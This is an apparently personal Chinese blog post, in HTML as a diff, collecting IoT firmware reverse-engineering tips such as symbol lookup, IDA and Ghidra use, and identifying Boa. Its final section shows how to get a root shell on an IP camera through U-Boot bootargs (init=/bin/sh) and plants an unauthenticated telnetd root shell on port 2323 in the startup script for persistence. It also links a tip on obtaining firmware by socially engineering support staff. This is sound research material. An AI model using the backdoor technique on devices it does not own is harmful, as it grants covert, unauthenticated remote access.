@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[toc] iot安全实用技巧函数定义在哪个so文件中12345# 1 挨个so文件搜find ./ -name &quot;*.so&quot; | xargs readelf -s &amp;gt; so.txtsubl so.txt# 2 ghidra中打开，设置lib目录，symbol-tree中搜索 查看所有elf的符号123find ./ -type f |xargs file|grep ELF |awk &apos;BE">
+<meta name="keywords" content="IOT安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="iot安全实用技巧">
+<meta property="og:url" content="http://21guns.top/2021/08/09/iot/iot安全实用技巧小结/index.html">
+<meta property="og:site_name" content="have a nice day">
+<meta property="og:description" content="[toc] iot安全实用技巧函数定义在哪个so文件中12345# 1 挨个so文件搜find ./ -name &quot;*.so&quot; | xargs readelf -s &amp;gt; so.txtsubl so.txt# 2 ghidra中打开，设置lib目录，symbol-tree中搜索 查看所有elf的符号123find ./ -type f |xargs file|grep ELF |awk &apos;BE">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2022-02-17T09:41:50.313Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="iot安全实用技巧">
+<meta name="twitter:description" content="[toc] iot安全实用技巧函数定义在哪个so文件中12345# 1 挨个so文件搜find ./ -name &quot;*.so&quot; | xargs readelf -s &amp;gt; so.txtsubl so.txt# 2 ghidra中打开，设置lib目录，symbol-tree中搜索 查看所有elf的符号123find ./ -type f |xargs file|grep ELF |awk &apos;BE">
+
+<link rel="canonical" href="http://21guns.top/2021/08/09/iot/iot安全实用技巧小结/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>iot安全实用技巧 | have a nice day</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">have a nice day</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/08/09/iot/iot安全实用技巧小结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="21Guns">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="have a nice day">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          iot安全实用技巧
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-09 14:41:33" itemprop="dateCreated datePublished" datetime="2021-08-09T14:41:33+08:00">2021-08-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-17 17:41:50" itemprop="dateModified" datetime="2022-02-17T17:41:50+08:00">2022-02-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>[toc]</p>
+<h1 id="iot安全实用技巧"><a href="#iot安全实用技巧" class="headerlink" title="iot安全实用技巧"></a>iot安全实用技巧</h1><h2 id="函数定义在哪个so文件中"><a href="#函数定义在哪个so文件中" class="headerlink" title="函数定义在哪个so文件中"></a>函数定义在哪个so文件中</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 挨个so文件搜</span></span><br><span class="line">find ./ -name <span class="string">"*.so"</span> | xargs readelf -s &gt; so.txt</span><br><span class="line">subl so.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 ghidra中打开，设置lib目录，symbol-tree中搜索</span></span><br></pre></td></tr></table></figure>
+<h2 id="查看所有elf的符号"><a href="#查看所有elf的符号" class="headerlink" title="查看所有elf的符号"></a>查看所有elf的符号</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find ./ -<span class="built_in">type</span> f |xargs file|grep ELF |awk <span class="string">'BEGIN&#123;FS=":"&#125; &#123;printf $1 "\n"&#125;'</span> | xargs readelf -s &gt; 1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat 1.txt看谁有system</span></span><br></pre></td></tr></table></figure>
+<h2 id="已编译的"><a href="#已编译的" class="headerlink" title="已编译的"></a>已编译的</h2><ul>
+<li>编译好的静态的gdbserver：<a href="https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt" target="_blank" rel="noopener">https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt</a></li>
+</ul>
+<h2 id="ida快捷键"><a href="#ida快捷键" class="headerlink" title="ida快捷键"></a>ida快捷键</h2><ul>
+<li>D：data，转换byte、half、word</li>
+<li>R：字符转换</li>
+<li>O：offset，解释地址为数据段偏移量，用于字符串标号</li>
+<li>H：10/16进制转换</li>
+</ul>
+<h2 id="符号名识别"><a href="#符号名识别" class="headerlink" title="符号名识别"></a>符号名识别</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 依据日志打印判定 符号名：arcadyan_request_hook、mac</span></span><br><span class="line"><span class="comment"># 特征：print、log</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[%s] request from: IP=[%s], MAC=[%s]\n"</span>,<span class="string">"arcadyan_request_hook"</span>,(const char *)(a1 + 6360),(const char *)mac);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 依据配置读取判定 符号名：Hostname</span></span><br><span class="line"><span class="comment"># 特征：cfg、get</span></span><br><span class="line">mapi_ccfg_get_str(tid, <span class="string">"ARC_SYS_Hostname"</span>, Hostname, 32);</span><br><span class="line">mapi_tmp_get(tid_1, <span class="string">"TMP_WLAN_AOSS_WPS_Bridge_Busy"</span>, v58, 8);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 根据错误日志判断函数名也不全对</span></span><br><span class="line"><span class="comment"># 多个目标文件链接到同一个可执行文件，故可能有多种，如main中</span></span><br><span class="line">log_error_msg_fatal(<span class="string">"src/boa.c"</span>, 284, <span class="string">"main"</span>, <span class="string">"can't open /dev/null"</span>);</span><br><span class="line">log_error_msg_fatal(<span class="string">"src/boa.c"</span>, 579, <span class="string">"drop_privs"</span>, <span class="string">"setuid"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 打印错误日志时暴露函数名 </span></span><br><span class="line"><span class="comment"># 依次：文件名、行、函数名、错误信息</span></span><br><span class="line">log_error_msg_fatal(<span class="string">"src/boa.c"</span>, 284, <span class="string">"main"</span>, <span class="string">"can't open /dev/null"</span>);</span><br><span class="line">源码中：define DIE(mesg) log_error_mesg_fatal(__FILE__, __LINE__, __func__, mesg)</span><br></pre></td></tr></table></figure>
+<h2 id="寻找函数定义"><a href="#寻找函数定义" class="headerlink" title="寻找函数定义"></a>寻找函数定义</h2><ul>
+<li>cisco rv340的upload.cgi的base64_decode函数<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 共3个so文件</span></span><br><span class="line">File: ./usr/lib/libmiscu.so</span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 140 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">   131: 00005874   172 FUNC    GLOBAL DEFAULT   10 base64_decode</span><br><span class="line"></span><br><span class="line">File: ./usr/lib/libpolarssl.so</span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 543 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">   520: 000097a8   552 FUNC    GLOBAL DEFAULT   10 base64_decode</span><br><span class="line">   </span><br><span class="line">File: ./usr/lib/libmbedtls.so</span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 543 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">   520: 000097a8   552 FUNC    GLOBAL DEFAULT   10 base64_decode</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 2与3同，size和value相同，均指向同一个文件</span></span><br><span class="line">lrwxr-xr-x 1 501 dialout 13 Aug 13 09:35 usr/lib/libpolarssl.so -&gt; libmbedtls.so</span><br><span class="line">lrwxr-xr-x 1 501 dialout 15 Aug 13 09:35 usr/lib/libmbedtls.so -&gt; libmbedtls.so.9</span><br><span class="line">lrwxr-xr-x 1 501 dialout 20 Aug 13 09:35 usr/lib/libmbedtls.so.9 -&gt; libmbedtls.so.1.3.12</span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序加载了哪个so</span></span><br><span class="line"><span class="comment"># 没找到，</span></span><br><span class="line">/tmp <span class="comment"># ps|grep nginx</span></span><br><span class="line">10657 root     16588 S    nginx: master process /usr/sbin/nginx</span><br><span class="line">/tmp <span class="comment"># cat /proc/10657/maps</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结合调用方，直接逆向so文件（就俩而已）</span></span><br><span class="line"><span class="comment"># upload.cgi</span></span><br><span class="line">v18 = base64_decode(http_cookie, &amp;save_ptr);</span><br><span class="line"><span class="comment"># libmiscu.so</span></span><br><span class="line">void *__fastcall base64_decode(char *a1, int *a2)</span><br><span class="line"><span class="comment"># libmbedtls.so.1.3.12</span></span><br><span class="line">int __fastcall base64_decode(_BYTE *a1, unsigned int *a2, unsigned __int8 *a3, unsigned int a4)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="函数识别"><a href="#函数识别" class="headerlink" title="函数识别"></a>函数识别</h2><ul>
+<li>mips little endian，ghidra 好于 ida<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二进制是相同的，解析出的指令不同</span></span><br><span class="line"><span class="comment"># ida未识别为函数，li+addiu</span></span><br><span class="line">.text:00415418 4C 00 1C 3C+                li      <span class="variable">$gp</span>, unk_4C1810</span><br><span class="line">.text:00415418 10 18 9C 27</span><br><span class="line">.text:00415420 D8 FF BD 27                 addiu   <span class="variable">$sp</span>, -0x28</span><br><span class="line"><span class="comment"># ghidra识别成功，lui+addiu+addiu</span></span><br><span class="line">00415418 4c 00 1c 3c     lui        gp,0x4c</span><br><span class="line">0041541c 10 18 9c 27     addiu      gp,gp,0x1810</span><br><span class="line">00415420 d8 ff bd 27     addiu      sp,sp,-0x28</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="发现开源软件"><a href="#发现开源软件" class="headerlink" title="发现开源软件"></a>发现开源软件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># main中打印帮助</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">    opt = getopt(argc, (char *const *)argv, <span class="string">"c:vdl:f:r:a:"</span>);</span><br><span class="line">    switch ( opt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">        fprintf((FILE *)stderr, <span class="string">"boa: server version %s\n"</span>, <span class="string">"1.32.1.10"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># string窗口中搜索boa，作为http响应的字段</span></span><br><span class="line">Server: Boa/0.94.14rc21</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码时：版本号是0.94.14rc21而非1.32.1.10</span></span><br><span class="line">http://www.boa.org/boa-0.94.14rc21.tar.gz</span><br></pre></td></tr></table></figure>
+<h2 id="判定main"><a href="#判定main" class="headerlink" title="判定main"></a>判定main</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_A08C为main</span></span><br><span class="line">// positive sp value has been detected, the output may be wrong!<span class="comment"># ？？？</span></span><br><span class="line">int start()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> ((int (__fastcall *)(int (__fastcall *)(int, char *const *)))_uClibc_main)(sub_A08C);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 汇编程序的入口是_start，而C程序的入口是main函数</span></span><br><span class="line"><span class="comment"># main函数是程序的入口点其实不准确，_start才是真正的入口点，而main函数是被_start调用的</span></span><br></pre></td></tr></table></figure>
+<h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><ul>
+<li>社工客服法：<a href="https://xz.aliyun.com/t/5054" target="_blank" rel="noopener">https://xz.aliyun.com/t/5054</a></li>
+</ul>
+<h2 id="uboot-getshell"><a href="#uboot-getshell" class="headerlink" title="uboot-getshell"></a>uboot-getshell</h2><ul>
+<li>任意键进入uboot，修改环境变量</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">lxl@MBP  ~  minicom -c on</span><br><span class="line">U-Boot 2013.10.0-AK_V3.0.08 (Mar 05 2019 - 15:37:04)</span><br><span class="line"></span><br><span class="line">DRAM:  64 MiB</span><br><span class="line">8 MiB</span><br><span class="line">Create flash partition table init OK!</span><br><span class="line">ANYKA SDHC/MMC4.0: 0</span><br><span class="line">Load Env CRC OK!</span><br><span class="line">In:    serial</span><br><span class="line">Out:   serial</span><br><span class="line">Err:   serial</span><br><span class="line">Net:   AKEthernet-0</span><br><span class="line"></span><br><span class="line">Hit any key to stop autoboot:  3</span><br><span class="line"> 0</span><br><span class="line"></span><br><span class="line">anyka$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改环境变量并保存</span></span><br><span class="line"><span class="comment"># bootargs的init=/bin/sh</span></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$setenv</span> bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$saveenv</span></span><br><span class="line"></span><br><span class="line">Saving Environment to SPI Flash...</span><br><span class="line">Env save <span class="keyword">done</span> OK</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br></pre></td></tr></table></figure>
+<ul>
+<li>重启，uboot后进入sh，修改自启程序，实现常驻</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0 mtdblock8对应/mnt/mtd，jffs2文件系统（自启程序nvipcstart.sh位于此）</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">tmpfs on /tmp <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">tmpfs on /var <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">devpts on /dev/pts <span class="built_in">type</span> devpts (rw,relatime,mode=600,ptmxmode=000)</span><br><span class="line">tmpfs on /mnt/mtd <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">sysfs on /sys <span class="built_in">type</span> sysfs (rw,relatime)</span><br><span class="line">/dev/mtdblock5 on /usr <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock6 on /mvs <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock7 on /ext <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock8 on /mnt/mtd <span class="built_in">type</span> jffs2 (rw,relatime)</span><br><span class="line">/dev/loop0 on /tmp/ramdisk <span class="built_in">type</span> vfat (rw,relatime,fmask=0022,dmask=0022,codepage=cp437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 进入sh</span></span><br><span class="line">/bin/sh: c��ɹ���off</span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">bin   dev   etc   ext   init  lib   mnt   mvs   proc  sbin  sys   tmp   usr   var</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 mount命令需挂载proc（本身挂载proc就需要mount，不矛盾？）</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">mount: no /proc/mounts</span><br><span class="line">~ <span class="comment"># mount -t proc /proc</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 挂载mtdblock8</span></span><br><span class="line">~ <span class="comment"># cd mnt/mtd</span></span><br><span class="line">/mnt/mtd <span class="comment"># ls</span></span><br><span class="line">/mnt/mtd <span class="comment"># mount -t jffs2 /dev/mtdblock8 /mnt/mtd</span></span><br><span class="line">/mnt/mtd <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">/dev/mtdblock8 on /mnt/mtd <span class="built_in">type</span> jffs2 (rw,relatime)</span><br><span class="line"></span><br><span class="line">/mnt/mtd <span class="comment"># cd ..</span></span><br><span class="line">/mnt <span class="comment"># cd mtd/</span></span><br><span class="line">/mnt/mtd <span class="comment"># ls</span></span><br><span class="line">DDNSClient.ini          inet.conf               prerun</span><br><span class="line">ResetBind.ini           ipsourceserver.ini      recorde.ini</span><br><span class="line">as9ipcwatchdog          isp_mis2006.conf        recorder</span><br><span class="line">as9nvserver             mqtest_stop             resolv.conf</span><br><span class="line">as9updatednsip          mtd_remount.sh          stopallapp.sh</span><br><span class="line">asnvdvrclientdemo       mv_clog_cache.data      styleId</span><br><span class="line">audiofile_player        mvconf                  user_info.ini</span><br><span class="line">authority.ini           mvsound                 venc.cfg</span><br><span class="line">dns_last_serverips.ini  network_Info.ini        vg_boot.sh</span><br><span class="line">h265_1920x1080.cfg      nvconfig.ini            vsipbroadcast</span><br><span class="line">idcheck.sh              nvipcstart.sh           wificonf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 修改系统自启程序，实现常驻</span></span><br><span class="line">/mnt/mtd <span class="comment"># cat nvipcstart.sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">hostname V380E</span><br><span class="line">/sbin/telnetd -p 2323 -l /bin/sh &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 umount（是否必要？）</span></span><br><span class="line"><span class="comment"># 实测reboot不行</span></span><br><span class="line">/mnt <span class="comment"># umount /mnt/mtd</span></span><br><span class="line">/mnt <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">/mnt <span class="comment"># reboot</span></span><br><span class="line">/mnt <span class="comment"># ls</span></span><br><span class="line">mtd     nand    sdcard</span><br></pre></td></tr></table></figure>
+<ul>
+<li>telnet连接</li>
+</ul>
